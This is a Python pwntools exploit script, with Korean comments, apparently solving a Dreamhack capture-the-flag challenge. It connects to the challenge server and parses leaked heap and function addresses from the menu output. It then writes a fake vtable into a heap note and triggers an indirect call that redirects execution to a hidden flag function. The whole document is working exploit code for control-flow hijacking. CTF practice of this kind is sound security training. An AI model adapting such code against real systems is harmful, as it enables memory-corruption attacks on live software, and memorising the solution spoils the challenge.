from pwn import *

# ==========================================
# [설정] 서버 연결
# ==========================================
target_host = 'host3.dreamhack.games'
target_port = 16926  # ★ 포트 번호 확인!

context.log_level = 'info'
p = remote(target_host, target_port)

def get_menu():
    p.recvuntil(b'> ')

# ==========================================
# [Step 1] 정보 수집
# ==========================================
log.info("Step 1: Leaking addresses...")
get_menu()
p.sendline(b'1')

p.recvuntil(b'Movement Pattern  : ')
heap_base = int(p.recvline().strip(), 16)
p.recvuntil(b'Skill: WEAKNESS   : ')
weakness_addr = int(p.recvline().strip(), 16)
p.recvuntil(b'Skill: Calibrate  : ')
calibrate_addr = int(p.recvline().strip(), 16)

# [설정] 로컬 성공 주소 (+0 Original)
hidden_flag_func = calibrate_addr + 16

log.info(f"Heap Base        : {hex(heap_base)}")
log.info(f"Hidden Func      : {hex(hidden_flag_func)}")

# ==========================================
# [Step 2] 힙 할당
# ==========================================
log.info("Step 2: Allocating Note...")
get_menu()
p.sendline(b'2')
p.recvuntil(b'words (1..=64): ')
p.sendline(b'64') 
p.recvuntil(b'on desk at ')
note_addr = int(p.recvline().split(b' ')[0], 16)
log.success(f"Note Address     : {hex(note_addr)}")

# ==========================================
# [Step 3] 페이로드 작성 (수정됨!)
# ==========================================
log.info("Step 3: Writing Payload (Fixing Note Index)...")

payload_vals = [
    note_addr,          # Index 0
    note_addr + 16,     # Index 1
    0,                  # Index 2
    0,                  # Index 3 (Guard)
    0,                  # Index 4
    hidden_flag_func    # Index 5
]

for off, val in enumerate(payload_vals):
    get_menu()
    p.sendline(b'3')                # Edit
    
    p.recvuntil(b'idx: ')
    p.sendline(b'0')                # ★ [Fix] 무조건 0번 노트 선택!
    
    p.recvuntil(b'off: ')
    p.sendline(str(off).encode())   # 오프셋은 0, 1, 2, 3... 변경
    
    p.recvuntil(b'val (hex like 0xdeadbeef or decimal): ')
    p.sendline(str(val).encode())
    
    # 디버깅용 로그 (잘 들어가는지 확인)
    # log.info(f"Writing Note[0] Offset[{off}] = {hex(val)}")

log.success("Payload injection complete!")

# ==========================================
# [Step 4] 실행 준비 (Snapshot)
# ==========================================
log.info("Step 4: Setting Snapshot (Menu 4)...")

get_menu()
p.sendline(b'4')

p.recvuntil(b'data_ptr: ')
p.sendline(str(note_addr).encode())

p.recvuntil(b'vtable_ptr: ')
p.sendline(str(note_addr + 16).encode())

# 싱크 맞추기
p.recvuntil(b'Snapshot set:')
p.recvline() 

# ==========================================
# [Step 5] 트리거 & 플래그 획득
# ==========================================
log.info("Step 5: Triggering (Menu 5)...")

get_menu()
p.sendline(b'5')

log.success("Exploit sent! Checking for flag...")
p.interactive()